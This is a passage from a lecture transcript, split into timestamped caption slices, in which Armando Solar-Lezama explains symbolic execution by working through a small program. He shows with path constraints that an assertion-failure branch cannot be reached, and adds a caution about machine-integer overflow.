              <time_slice>4:19</time_slice>
              <text_slice>I can go in and run this
code with a concrete input.</text_slice>
            </slice>
            <slice>
              <time_slice>4:24</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>4:25</time_slice>
              <text_slice>So let's say that I start
with an input where x is 4</text_slice>
            </slice>
            <slice>
              <time_slice>4:29</time_slice>
              <text_slice>and y is 4.</text_slice>
            </slice>
            <slice>
              <time_slice>4:31</time_slice>
              <text_slice>And initially t is going
to have the value 0</text_slice>
            </slice>
            <slice>
              <time_slice>4:35</time_slice>
              <text_slice>right after I declare it.</text_slice>
            </slice>
            <slice>
              <time_slice>4:36</time_slice>
              <text_slice>So before we go with
normal execution,</text_slice>
            </slice>
            <slice>
              <time_slice>4:38</time_slice>
              <text_slice>what are some of the
important point here?</text_slice>
            </slice>
            <slice>
              <time_slice>4:40</time_slice>
              <text_slice>The fact that we need some
representation of the state</text_slice>
            </slice>
            <slice>
              <time_slice>4:44</time_slice>
              <text_slice>of the program, right?</text_slice>
            </slice>
            <slice>
              <time_slice>4:45</time_slice>
              <text_slice>Whether we're doing
normal execution</text_slice>
            </slice>
            <slice>
              <time_slice>4:48</time_slice>
              <text_slice>or whether we're doing
symbolic execution,</text_slice>
            </slice>
            <slice>
              <time_slice>4:52</time_slice>
              <text_slice>we need to have some
way to characterize</text_slice>
            </slice>
            <slice>
              <time_slice>4:53</time_slice>
              <text_slice>the state of the program.</text_slice>
            </slice>
            <slice>
              <time_slice>4:54</time_slice>
              <text_slice>And in this case, this
is such a simple program</text_slice>
            </slice>
            <slice>
              <time_slice>4:56</time_slice>
              <text_slice>that it doesn't use the heap.</text_slice>
            </slice>
            <slice>
              <time_slice>4:59</time_slice>
              <text_slice>It doesn't use the stack.</text_slice>
            </slice>
            <slice>
              <time_slice>5:01</time_slice>
              <text_slice>There are no function calls.</text_slice>
            </slice>
            <slice>
              <time_slice>5:03</time_slice>
              <text_slice>So the state can be fully
characterized by these three</text_slice>
            </slice>
            <slice>
              <time_slice>5:07</time_slice>
              <text_slice>variables together
with knowledge of where</text_slice>
            </slice>
            <slice>
              <time_slice>5:10</time_slice>
              <text_slice>in the program I'm at, right?</text_slice>
            </slice>
            <slice>
              <time_slice>5:12</time_slice>
              <text_slice>So if I start
executing with 4, 4,</text_slice>
            </slice>
            <slice>
              <time_slice>5:15</time_slice>
              <text_slice>and 0, so when I get to this
branch, is 4 greater than 4?</text_slice>
            </slice>
            <slice>
              <time_slice>5:21</time_slice>
              <text_slice>Clearly not.</text_slice>
            </slice>
            <slice>
              <time_slice>5:22</time_slice>
              <text_slice>So then I'm going to be
executing t equals y.</text_slice>
            </slice>
            <slice>
              <time_slice>5:26</time_slice>
              <text_slice>So now after I do
that t is no longer 0.</text_slice>
            </slice>
            <slice>
              <time_slice>5:29</time_slice>
              <text_slice>It now has the value 4.</text_slice>
            </slice>
            <slice>
              <time_slice>5:32</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>5:32</time_slice>
              <text_slice>So that is now the
state of my program.</text_slice>
            </slice>
            <slice>
              <time_slice>5:35</time_slice>
              <text_slice>And then I can
evaluate this branch.</text_slice>
            </slice>
            <slice>
              <time_slice>5:38</time_slice>
              <text_slice>Is it the case that
t is less than x?</text_slice>
            </slice>
            <slice>
              <time_slice>5:43</time_slice>
              <text_slice>No.</text_slice>
            </slice>
            <slice>
              <time_slice>5:44</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>5:44</time_slice>
              <text_slice>So we dodged the bullet.</text_slice>
            </slice>
            <slice>
              <time_slice>5:46</time_slice>
              <text_slice>We did not get an
assertion failure.</text_slice>
            </slice>
            <slice>
              <time_slice>5:49</time_slice>
              <text_slice>There was no problem in
this particular execution.</text_slice>
            </slice>
            <slice>
              <time_slice>5:52</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>5:52</time_slice>
              <text_slice>But that doesn't
really tell us anything</text_slice>
            </slice>
            <slice>
              <time_slice>5:55</time_slice>
              <text_slice>about any other execution.</text_slice>
            </slice>
            <slice>
              <time_slice>5:57</time_slice>
              <text_slice>All we know is that
under the input</text_slice>
            </slice>
            <slice>
              <time_slice>5:59</time_slice>
              <text_slice>x equals 4 and y equals 4, the
program is not going to fail.</text_slice>
            </slice>
            <slice>
              <time_slice>6:03</time_slice>
              <text_slice>But it tells us nothing
about what's going to happen</text_slice>
            </slice>
            <slice>
              <time_slice>6:06</time_slice>
              <text_slice>on the input
[? 2, 1, ?] for example.</text_slice>
            </slice>
            <slice>
              <time_slice>6:10</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>6:10</time_slice>
              <text_slice>And in this input you see
that this input is actually</text_slice>
            </slice>
            <slice>
              <time_slice>6:13</time_slice>
              <text_slice>going to follow a different
path in the execution.</text_slice>
            </slice>
            <slice>
              <time_slice>6:17</time_slice>
              <text_slice>This time we're actually
going to see that t equals x.</text_slice>
            </slice>
            <slice>
              <time_slice>6:22</time_slice>
              <text_slice>We're actually going
to set t equals 2x.</text_slice>
            </slice>
            <slice>
              <time_slice>6:25</time_slice>
              <text_slice>So after executing these
t will be equal to 2,</text_slice>
            </slice>
            <slice>
              <time_slice>6:29</time_slice>
              <text_slice>but is there any problem
in this execution?</text_slice>
            </slice>
            <slice>
              <time_slice>6:36</time_slice>
              <text_slice>Will there be an assertion
failure on this input?</text_slice>
            </slice>
            <slice>
              <time_slice>6:42</time_slice>
              <text_slice>Well, so let's see.</text_slice>
            </slice>
            <slice>
              <time_slice>6:44</time_slice>
              <text_slice>So if t is 2.</text_slice>
            </slice>
            <slice>
              <time_slice>6:45</time_slice>
              <text_slice>And x is 2.</text_slice>
            </slice>
            <slice>
              <time_slice>6:47</time_slice>
              <text_slice>Is t less than x?</text_slice>
            </slice>
            <slice>
              <time_slice>6:50</time_slice>
              <text_slice>No.</text_slice>
            </slice>
            <slice>
              <time_slice>6:51</time_slice>
              <text_slice>So it looks like we
dodged a bullet again.</text_slice>
            </slice>
            <slice>
              <time_slice>6:54</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>6:54</time_slice>
              <text_slice>So here we have two
concrete inputs.</text_slice>
            </slice>
            <slice>
              <time_slice>6:57</time_slice>
              <text_slice>And they told us that on
these two concrete inputs</text_slice>
            </slice>
            <slice>
              <time_slice>7:00</time_slice>
              <text_slice>the program didn't fail.</text_slice>
            </slice>
            <slice>
              <time_slice>7:01</time_slice>
              <text_slice>But that really doesn't tell us
anything about any other input.</text_slice>
            </slice>
            <slice>
              <time_slice>7:06</time_slice>
              <text_slice>And so the idea with
symbolic execution</text_slice>
            </slice>
            <slice>
              <time_slice>7:10</time_slice>
              <text_slice>is we want to go beyond these
single input executions.</text_slice>
            </slice>
            <slice>
              <time_slice>7:13</time_slice>
              <text_slice>And we want to be able
to actually reason</text_slice>
            </slice>
            <slice>
              <time_slice>7:17</time_slice>
              <text_slice>about the behavior of
the program on very</text_slice>
            </slice>
            <slice>
              <time_slice>7:20</time_slice>
              <text_slice>large sets of inputs.</text_slice>
            </slice>
            <slice>
              <time_slice>7:21</time_slice>
              <text_slice>In some cases, infinite
sets of possible inputs.</text_slice>
            </slice>
            <slice>
              <time_slice>7:25</time_slice>
              <text_slice>And the basic idea
is as follows.</text_slice>
            </slice>
            <slice>
              <time_slice>7:28</time_slice>
              <text_slice>So for a program
like this, just like</text_slice>
            </slice>
            <slice>
              <time_slice>7:31</time_slice>
              <text_slice>before the state
of the program is</text_slice>
            </slice>
            <slice>
              <time_slice>7:33</time_slice>
              <text_slice>characterized by the
value of these three</text_slice>
            </slice>
            <slice>
              <time_slice>7:36</time_slice>
              <text_slice>different variables.</text_slice>
            </slice>
            <slice>
              <time_slice>7:37</time_slice>
              <text_slice>Right? x, y, and t together with
knowing where in the program</text_slice>
            </slice>
            <slice>
              <time_slice>7:41</time_slice>
              <text_slice>I'm at.</text_slice>
            </slice>
            <slice>
              <time_slice>7:42</time_slice>
              <text_slice>But now instead of
concrete values for x and y</text_slice>
            </slice>
            <slice>
              <time_slice>7:48</time_slice>
              <text_slice>what I'm going to have
is a symbolic value, just</text_slice>
            </slice>
            <slice>
              <time_slice>7:51</time_slice>
              <text_slice>a variable.</text_slice>
            </slice>
            <slice>
              <time_slice>7:52</time_slice>
              <text_slice>A variable that allows me
to give a name to this value</text_slice>
            </slice>
            <slice>
              <time_slice>7:57</time_slice>
              <text_slice>that the user is going
to provide at the input.</text_slice>
            </slice>
            <slice>
              <time_slice>8:00</time_slice>
              <text_slice>So what that means is that
the state of my program</text_slice>
            </slice>
            <slice>
              <time_slice>8:03</time_slice>
              <text_slice>is no longer a mapping
from variable names</text_slice>
            </slice>
            <slice>
              <time_slice>8:07</time_slice>
              <text_slice>to concrete values.</text_slice>
            </slice>
            <slice>
              <time_slice>8:08</time_slice>
              <text_slice>It's now a mapping from variable
names to these symbolic values.</text_slice>
            </slice>
            <slice>
              <time_slice>8:13</time_slice>
              <text_slice>And a symbolic value,
you can essentially</text_slice>
            </slice>
            <slice>
              <time_slice>8:15</time_slice>
              <text_slice>think of it as a formula.</text_slice>
            </slice>
            <slice>
              <time_slice>8:18</time_slice>
              <text_slice>So in this case the
formula for x is just x.</text_slice>
            </slice>
            <slice>
              <time_slice>8:23</time_slice>
              <text_slice>And the formula for y is just y.</text_slice>
            </slice>
            <slice>
              <time_slice>8:25</time_slice>
              <text_slice>And for t, it's
actually the value 0.</text_slice>
            </slice>
            <slice>
              <time_slice>8:27</time_slice>
              <text_slice>We know that for every input,
doesn't matter what you do.</text_slice>
            </slice>
            <slice>
              <time_slice>8:31</time_slice>
              <text_slice>The value of t after the first
statement is going to be 0.</text_slice>
            </slice>
            <slice>
              <time_slice>8:35</time_slice>
              <text_slice>But now here's where
it gets interesting.</text_slice>
            </slice>
            <slice>
              <time_slice>8:39</time_slice>
              <text_slice>So we get to this
branch right here</text_slice>
            </slice>
            <slice>
              <time_slice>8:42</time_slice>
              <text_slice>that says, if x
is greater than y,</text_slice>
            </slice>
            <slice>
              <time_slice>8:44</time_slice>
              <text_slice>we're going to go
in one direction.</text_slice>
            </slice>
            <slice>
              <time_slice>8:48</time_slice>
              <text_slice>If it's less than
or equal to y, we're</text_slice>
            </slice>
            <slice>
              <time_slice>8:50</time_slice>
              <text_slice>going to go in the
other direction.</text_slice>
            </slice>
            <slice>
              <time_slice>8:52</time_slice>
              <text_slice>Now do we know
anything about x and y?</text_slice>
            </slice>
            <slice>
              <time_slice>8:59</time_slice>
              <text_slice>What do we know about them?</text_slice>
            </slice>
            <slice>
              <time_slice>9:05</time_slice>
              <text_slice>We know their type, at least.</text_slice>
            </slice>
            <slice>
              <time_slice>9:07</time_slice>
              <text_slice>So that's a start.</text_slice>
            </slice>
            <slice>
              <time_slice>9:08</time_slice>
              <text_slice>So we know that they're going
to be ranging from min int</text_slice>
            </slice>
            <slice>
              <time_slice>9:11</time_slice>
              <text_slice>to max int, but that's about
all we know about them.</text_slice>
            </slice>
            <slice>
              <time_slice>9:16</time_slice>
              <text_slice>And it turns out
that this information</text_slice>
            </slice>
            <slice>
              <time_slice>9:17</time_slice>
              <text_slice>that we know about them is not
sufficient to tell us which</text_slice>
            </slice>
            <slice>
              <time_slice>9:22</time_slice>
              <text_slice>direction this branch might go.</text_slice>
            </slice>
            <slice>
              <time_slice>9:23</time_slice>
              <text_slice>This branch could go either way.</text_slice>
            </slice>
            <slice>
              <time_slice>9:26</time_slice>
              <text_slice>And so now there are many
things and we can do,</text_slice>
            </slice>
            <slice>
              <time_slice>9:32</time_slice>
              <text_slice>but what's one possible thing
that we could do at this point?</text_slice>
            </slice>
            <slice>
              <time_slice>9:44</time_slice>
              <text_slice>Make a wild guess.</text_slice>
            </slice>
            <slice>
              <time_slice>9:46</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>9:46</time_slice>
              <text_slice>ARMANDO SOLAR-LEZAMA: Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>9:48</time_slice>
              <text_slice>We could follow both branches.</text_slice>
            </slice>
            <slice>
              <time_slice>9:49</time_slice>
              <text_slice>We could flip a coin and pick
one branch and take that.</text_slice>
            </slice>
            <slice>
              <time_slice>9:54</time_slice>
              <text_slice>So if we want to
follow both branches</text_slice>
            </slice>
            <slice>
              <time_slice>9:56</time_slice>
              <text_slice>we have to follow one and
then the other one, right?</text_slice>
            </slice>
            <slice>
              <time_slice>9:58</time_slice>
              <text_slice>So let's say we start
with this branch.</text_slice>
            </slice>
            <slice>
              <time_slice>10:04</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>10:04</time_slice>
              <text_slice>So now we are at this branch.</text_slice>
            </slice>
            <slice>
              <time_slice>10:07</time_slice>
              <text_slice>So what we know is that if
we make it to this branch,</text_slice>
            </slice>
            <slice>
              <time_slice>10:11</time_slice>
              <text_slice>in this branch t is now going
to have the same value as x.</text_slice>
            </slice>
            <slice>
              <time_slice>10:17</time_slice>
              <text_slice>And we don't know what
that value is going to be,</text_slice>
            </slice>
            <slice>
              <time_slice>10:20</time_slice>
              <text_slice>but we have a name for it.</text_slice>
            </slice>
            <slice>
              <time_slice>10:21</time_slice>
              <text_slice>It's this script letter x.</text_slice>
            </slice>
            <slice>
              <time_slice>10:26</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>10:26</time_slice>
              <text_slice>So that's the value
of t on that branch.</text_slice>
            </slice>
            <slice>
              <time_slice>10:31</time_slice>
              <text_slice>If we were to take the opposite
branch then what would happen?</text_slice>
            </slice>
            <slice>
              <time_slice>10:36</time_slice>
              <text_slice>The value of t would be
something different, right?</text_slice>
            </slice>
            <slice>
              <time_slice>10:38</time_slice>
              <text_slice>In that branch, the value of t
would be the symbolic value y.</text_slice>
            </slice>
            <slice>
              <time_slice>10:45</time_slice>
              <text_slice>So that means that when we get
to this point in the program,</text_slice>
            </slice>
            <slice>
              <time_slice>10:50</time_slice>
              <text_slice>what is the value of t?</text_slice>
            </slice>
            <slice>
              <time_slice>10:51</time_slice>
              <text_slice>Well, maybe it's x.</text_slice>
            </slice>
            <slice>
              <time_slice>10:53</time_slice>
              <text_slice>And maybe it's y.</text_slice>
            </slice>
            <slice>
              <time_slice>10:54</time_slice>
              <text_slice>We don't know exactly which
one it is, but why don't we</text_slice>
            </slice>
            <slice>
              <time_slice>10:58</time_slice>
              <text_slice>give it a name?</text_slice>
            </slice>
            <slice>
              <time_slice>10:59</time_slice>
              <text_slice>Let's call it t0.</text_slice>
            </slice>
            <slice>
              <time_slice>11:02</time_slice>
              <text_slice>And what do we know about t0?</text_slice>
            </slice>
            <slice>
              <time_slice>11:07</time_slice>
              <text_slice>What are the cases where t0
is going to be equal to x?</text_slice>
            </slice>
            <slice>
              <time_slice>11:14</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>11:15</time_slice>
              <text_slice>ARMANDO SOLAR-LEZAMA:
That's right.</text_slice>
            </slice>
            <slice>
              <time_slice>11:17</time_slice>
              <text_slice>So essentially what we know is
that if x is greater than y,</text_slice>
            </slice>
            <slice>
              <time_slice>11:21</time_slice>
              <text_slice>then this implies that it's x.</text_slice>
            </slice>
            <slice>
              <time_slice>11:27</time_slice>
              <text_slice>And if x is less than or equal
to y that implies that it's y,</text_slice>
            </slice>
            <slice>
              <time_slice>11:37</time_slice>
              <text_slice>right?</text_slice>
            </slice>
            <slice>
              <time_slice>11:38</time_slice>
              <text_slice>And so we have this
value that we've defined.</text_slice>
            </slice>
            <slice>
              <time_slice>11:41</time_slice>
              <text_slice>We'll call it t0.</text_slice>
            </slice>
            <slice>
              <time_slice>11:43</time_slice>
              <text_slice>And it has these
logical properties.</text_slice>
            </slice>
            <slice>
              <time_slice>11:46</time_slice>
              <text_slice>So at this point in
the program we actually</text_slice>
            </slice>
            <slice>
              <time_slice>11:53</time_slice>
              <text_slice>have a name for the value of t.</text_slice>
            </slice>
            <slice>
              <time_slice>11:56</time_slice>
              <text_slice>It's t0.</text_slice>
            </slice>
            <slice>
              <time_slice>12:00</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>12:00</time_slice>
              <text_slice>And so what did we do here?</text_slice>
            </slice>
            <slice>
              <time_slice>12:03</time_slice>
              <text_slice>We took both branches
of this if statement.</text_slice>
            </slice>
            <slice>
              <time_slice>12:09</time_slice>
              <text_slice>And then we computed
the symbolic value</text_slice>
            </slice>
            <slice>
              <time_slice>12:12</time_slice>
              <text_slice>by looking at under
what conditions</text_slice>
            </slice>
            <slice>
              <time_slice>12:14</time_slice>
              <text_slice>am I going to take one branch,
under what conditions am I</text_slice>
            </slice>
            <slice>
              <time_slice>12:17</time_slice>
              <text_slice>going to take another branch?</text_slice>
            </slice>
            <slice>
              <time_slice>12:19</time_slice>
              <text_slice>And then looking
at what values am</text_slice>
            </slice>
            <slice>
              <time_slice>12:22</time_slice>
              <text_slice>I going to be assigning to
t on both of those branches?</text_slice>
            </slice>
            <slice>
              <time_slice>12:26</time_slice>
              <text_slice>So now it comes to the
point where we have to ask,</text_slice>
            </slice>
            <slice>
              <time_slice>12:31</time_slice>
              <text_slice>can t be less than x?</text_slice>
            </slice>
            <slice>
              <time_slice>12:33</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>12:33</time_slice>
              <text_slice>So what is the value of t?</text_slice>
            </slice>
            <slice>
              <time_slice>12:35</time_slice>
              <text_slice>The value of t is now t0.</text_slice>
            </slice>
            <slice>
              <time_slice>12:37</time_slice>
              <text_slice>So what we want
to know is, is it</text_slice>
            </slice>
            <slice>
              <time_slice>12:41</time_slice>
              <text_slice>possible for t0
to be less than x?</text_slice>
            </slice>
            <slice>
              <time_slice>12:47</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>12:47</time_slice>
              <text_slice>Now remember the
first branch we hit</text_slice>
            </slice>
            <slice>
              <time_slice>12:51</time_slice>
              <text_slice>we were asking a
question about x and y.</text_slice>
            </slice>
            <slice>
              <time_slice>12:53</time_slice>
              <text_slice>And we knew nothing
about x and y.</text_slice>
            </slice>
            <slice>
              <time_slice>12:56</time_slice>
              <text_slice>The only thing we
knew about x and y</text_slice>
            </slice>
            <slice>
              <time_slice>12:59</time_slice>
              <text_slice>was that they were of type int.</text_slice>
            </slice>
            <slice>
              <time_slice>13:02</time_slice>
              <text_slice>But now with t0 we actually
know a lot about t0.</text_slice>
            </slice>
            <slice>
              <time_slice>13:06</time_slice>
              <text_slice>We know that t0 is going to
be equal to x in some cases.</text_slice>
            </slice>
            <slice>
              <time_slice>13:11</time_slice>
              <text_slice>And it's going to be
equal to y in some cases.</text_slice>
            </slice>
            <slice>
              <time_slice>13:14</time_slice>
              <text_slice>And so this now gives
us a set of equations</text_slice>
            </slice>
            <slice>
              <time_slice>13:18</time_slice>
              <text_slice>that we can solve for.</text_slice>
            </slice>
            <slice>
              <time_slice>13:20</time_slice>
              <text_slice>So what we can say is,
is it possible to satisfy</text_slice>
            </slice>
            <slice>
              <time_slice>13:26</time_slice>
              <text_slice>t0 less than x knowing
that t0 satisfies</text_slice>
            </slice>
            <slice>
              <time_slice>13:31</time_slice>
              <text_slice>all of these properties?</text_slice>
            </slice>
            <slice>
              <time_slice>13:33</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>13:34</time_slice>
              <text_slice>So, in fact, we can
actually express this</text_slice>
            </slice>
            <slice>
              <time_slice>13:38</time_slice>
              <text_slice>as a constraint where we say,
so is it possible to have t0</text_slice>
            </slice>
            <slice>
              <time_slice>13:44</time_slice>
              <text_slice>less than x?</text_slice>
            </slice>
            <slice>
              <time_slice>13:45</time_slice>
              <text_slice>And to have x greater than
y implies t0 equals x.</text_slice>
            </slice>
            <slice>
              <time_slice>13:55</time_slice>
              <text_slice>And x less than or equal
to y imply t0 equal y.</text_slice>
            </slice>
            <slice>
              <time_slice>14:10</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>14:10</time_slice>
              <text_slice>So what we have here is an
equation that if that equation</text_slice>
            </slice>
            <slice>
              <time_slice>14:15</time_slice>
              <text_slice>has a solution, if it's
possible to find a value of t0,</text_slice>
            </slice>
            <slice>
              <time_slice>14:20</time_slice>
              <text_slice>and a value of x, and a value of
y that satisfies that equation,</text_slice>
            </slice>
            <slice>
              <time_slice>14:24</time_slice>
              <text_slice>then we know that those
values, when we plug them</text_slice>
            </slice>
            <slice>
              <time_slice>14:29</time_slice>
              <text_slice>into our program, when
the program executes,</text_slice>
            </slice>
            <slice>
              <time_slice>14:33</time_slice>
              <text_slice>it will take this branch.</text_slice>
            </slice>
            <slice>
              <time_slice>14:35</time_slice>
              <text_slice>And it will blow up when
it hits a assert false.</text_slice>
            </slice>
            <slice>
              <time_slice>14:42</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>14:43</time_slice>
              <text_slice>So what did we do here?</text_slice>
            </slice>
            <slice>
              <time_slice>14:45</time_slice>
              <text_slice>So we're executing this
program, but instead</text_slice>
            </slice>
            <slice>
              <time_slice>14:50</time_slice>
              <text_slice>of keeping our state as a
mapping from variable names</text_slice>
            </slice>
            <slice>
              <time_slice>14:57</time_slice>
              <text_slice>to values, what
we're doing is we're</text_slice>
            </slice>
            <slice>
              <time_slice>14:59</time_slice>
              <text_slice>keeping our program as a
mapping from variable names</text_slice>
            </slice>
            <slice>
              <time_slice>15:03</time_slice>
              <text_slice>to these symbolic values.</text_slice>
            </slice>
            <slice>
              <time_slice>15:07</time_slice>
              <text_slice>Essentially, other
variable names.</text_slice>
            </slice>
            <slice>
              <time_slice>15:09</time_slice>
              <text_slice>And in this case our
other variable names</text_slice>
            </slice>
            <slice>
              <time_slice>15:11</time_slice>
              <text_slice>are the script x, script
y, t0, and on top of that,</text_slice>
            </slice>
            <slice>
              <time_slice>15:17</time_slice>
              <text_slice>we have a set of
equations that tell us</text_slice>
            </slice>
            <slice>
              <time_slice>15:20</time_slice>
              <text_slice>how those values are related.</text_slice>
            </slice>
            <slice>
              <time_slice>15:22</time_slice>
              <text_slice>So we have an
equation that tells us</text_slice>
            </slice>
            <slice>
              <time_slice>15:24</time_slice>
              <text_slice>how t0 is related to
x and y in this case.</text_slice>
            </slice>
            <slice>
              <time_slice>15:29</time_slice>
              <text_slice>And solving for
that equation allows</text_slice>
            </slice>
            <slice>
              <time_slice>15:33</time_slice>
              <text_slice>us to answer the question
of whether this branch can</text_slice>
            </slice>
            <slice>
              <time_slice>15:37</time_slice>
              <text_slice>be taken or not.</text_slice>
            </slice>
            <slice>
              <time_slice>15:38</time_slice>
              <text_slice>Now just looking
at the equation,</text_slice>
            </slice>
            <slice>
              <time_slice>15:41</time_slice>
              <text_slice>can this branch be taken or not?</text_slice>
            </slice>
            <slice>
              <time_slice>15:45</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>15:46</time_slice>
              <text_slice>So it looks like the
branch cannot be taken.</text_slice>
            </slice>
            <slice>
              <time_slice>15:49</time_slice>
              <text_slice>Why not?</text_slice>
            </slice>
            <slice>
              <time_slice>15:50</time_slice>
              <text_slice>Because we're looking for
cases where t0 is less than x,</text_slice>
            </slice>
            <slice>
              <time_slice>15:56</time_slice>
              <text_slice>which means that if you're
in this case, then clearly</text_slice>
            </slice>
            <slice>
              <time_slice>15:59</time_slice>
              <text_slice>that's not going to be true.</text_slice>
            </slice>
            <slice>
              <time_slice>16:01</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>16:01</time_slice>
              <text_slice>So that means that when
x is greater than y,</text_slice>
            </slice>
            <slice>
              <time_slice>16:04</time_slice>
              <text_slice>then it cannot happen because
t0 will be equal to x.</text_slice>
            </slice>
            <slice>
              <time_slice>16:08</time_slice>
              <text_slice>And it cannot be equal to x and
less than x at the same time.</text_slice>
            </slice>
            <slice>
              <time_slice>16:11</time_slice>
              <text_slice>And what about in this case?</text_slice>
            </slice>
            <slice>
              <time_slice>16:13</time_slice>
              <text_slice>Can it happen in this case?</text_slice>
            </slice>
            <slice>
              <time_slice>16:15</time_slice>
              <text_slice>Can t0 be less than
x in this case?</text_slice>
            </slice>
            <slice>
              <time_slice>16:21</time_slice>
              <text_slice>No, it clearly cannot, right?</text_slice>
            </slice>
            <slice>
              <time_slice>16:22</time_slice>
              <text_slice>Because in this case we
know that x is less than y.</text_slice>
            </slice>
            <slice>
              <time_slice>16:29</time_slice>
              <text_slice>And so if t0 is going
to be less than x,</text_slice>
            </slice>
            <slice>
              <time_slice>16:31</time_slice>
              <text_slice>then it would also
be less than y.</text_slice>
            </slice>
            <slice>
              <time_slice>16:34</time_slice>
              <text_slice>But we know that in that case
t0 is exactly equal to y.</text_slice>
            </slice>
            <slice>
              <time_slice>16:37</time_slice>
              <text_slice>And therefore, again, that
case cannot be satisfied.</text_slice>
            </slice>
            <slice>
              <time_slice>16:42</time_slice>
              <text_slice>So what we have here is an
equation that has no solution.</text_slice>
            </slice>
            <slice>
              <time_slice>16:47</time_slice>
              <text_slice>It doesn't matter what values
you plug into this equation.</text_slice>
            </slice>
            <slice>
              <time_slice>16:49</time_slice>
              <text_slice>You cannot solve it and that
tells us that no matter what</text_slice>
            </slice>
            <slice>
              <time_slice>16:54</time_slice>
              <text_slice>inputs we pass to this code, it
will not go down this branch.</text_slice>
            </slice>
            <slice>
              <time_slice>17:01</time_slice>
              <text_slice>Now notice that when
making that argument here</text_slice>
            </slice>
            <slice>
              <time_slice>17:07</time_slice>
              <text_slice>I was basically alluding to
your intuition about integers,</text_slice>
            </slice>
            <slice>
              <time_slice>17:10</time_slice>
              <text_slice>about mathematical integers.</text_slice>
            </slice>
            <slice>
              <time_slice>17:13</time_slice>
              <text_slice>In practice we know that
machine ints don't quite</text_slice>
            </slice>
            <slice>
              <time_slice>17:17</time_slice>
              <text_slice>behave exactly the same
way as mathematical ints.</text_slice>
            </slice>
            <slice>
              <time_slice>17:22</time_slice>
              <text_slice>And there are some
cases where laws</text_slice>
            </slice>
            <slice>
              <time_slice>17:25</time_slice>
              <text_slice>that apply to mathematical
ints don't actually</text_slice>
            </slice>
            <slice>
              <time_slice>17:27</time_slice>
              <text_slice>apply to ints in programs.</text_slice>
            </slice>
            <slice>
              <time_slice>17:29</time_slice>
              <text_slice>And so when reasoning
about this we</text_slice>
            </slice>
            <slice>
              <time_slice>17:31</time_slice>
              <text_slice>have to be very
careful that when</text_slice>
            </slice>
            <slice>
              <time_slice>17:33</time_slice>
              <text_slice>we're solving these
equations, we're</text_slice>
            </slice>
            <slice>
              <time_slice>17:35</time_slice>
              <text_slice>keeping in mind
that these are not</text_slice>
            </slice>
            <slice>
              <time_slice>17:40</time_slice>
              <text_slice>the integers as they were taught
to us in elementary school.</text_slice>
            </slice>
            <slice>
              <time_slice>17:44</time_slice>
              <text_slice>These are 32-bit integers
that the machine uses.</text_slice>
            </slice>
            <slice>
              <time_slice>17:48</time_slice>
              <text_slice>And there are many
cases and many instances</text_slice>
            </slice>
            <slice>
              <time_slice>17:51</time_slice>
              <text_slice>of bugs that arose because
programmers were thinking</text_slice>
            </slice>
            <slice>
              <time_slice>17:55</time_slice>
              <text_slice>about their code in terms
of mathematical integers,</text_slice>
            </slice>
            <slice>
              <time_slice>17:58</time_slice>
              <text_slice>and not realizing that there
are things like overflows that</text_slice>
            </slice>
            <slice>
              <time_slice>18:02</time_slice>
              <text_slice>can cause the program
to behave differently</text_slice>
            </slice>
            <slice>
              <time_slice>18:04</time_slice>
              <text_slice>for mathematical inputs.</text_slice>
            </slice>
            <slice>
              <time_slice>18:06</time_slice>
              <text_slice>But the other thing is
what I've described here</text_slice>
            </slice>
            <slice>
              <time_slice>18:10</time_slice>
              <text_slice>is a purely intuitive argument.</text_slice>
            </slice>
            <slice>
              <time_slice>18:16</time_slice>
              <text_slice>I walk you through the process
of how to do this by hand,</text_slice>
            </slice>
            <slice>
              <time_slice>18:19</time_slice>
              <text_slice>but that's by no
means an algorithm.</text_slice>
            </slice>
            <slice>
              <time_slice>18:21</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>18:23</time_slice>
              <text_slice>The beauty of this idea
of symbolic execution,</text_slice>
            </slice>
            <slice>
              <time_slice>18:26</time_slice>
              <text_slice>however, is that it can be
coded into an algorithm.</text_slice>
            </slice>
            <slice>
              <time_slice>18:28</time_slice>
              <text_slice>And it can be solved in
a mechanical way, which</text_slice>
            </slice>
            <slice>
              <time_slice>18:31</time_slice>
              <text_slice>allows you to do this not
just for ten line programs,</text_slice>
            </slice>
            <slice>
              <time_slice>18:36</time_slice>
              <text_slice>but actually for
million line programs.</text_slice>
            </slice>
            <slice>
              <time_slice>18:38</time_slice>
              <text_slice>And it allows you
to actually take</text_slice>
            </slice>
            <slice>
              <time_slice>18:41</time_slice>
              <text_slice>this reasoning, and the
same intuitive reasoning</text_slice>
            </slice>
            <slice>
              <time_slice>18:43</time_slice>
              <text_slice>that we used in
this case to talk</text_slice>
            </slice>
            <slice>
              <time_slice>18:48</time_slice>
              <text_slice>about what happens
when we execute</text_slice>
            </slice>
            <slice>
              <time_slice>18:49</time_slice>
              <text_slice>this program on
different inputs.</text_slice>
            </slice>
            <slice>
              <time_slice>18:51</time_slice>
              <text_slice>And scale that reasoning
to very large programs.</text_slice>
            </slice>
            <slice>
              <time_slice>18:59</time_slice>
              <text_slice>Are there any questions so far?</text_slice>
            </slice>
            <slice>
              <time_slice>19:05</time_slice>
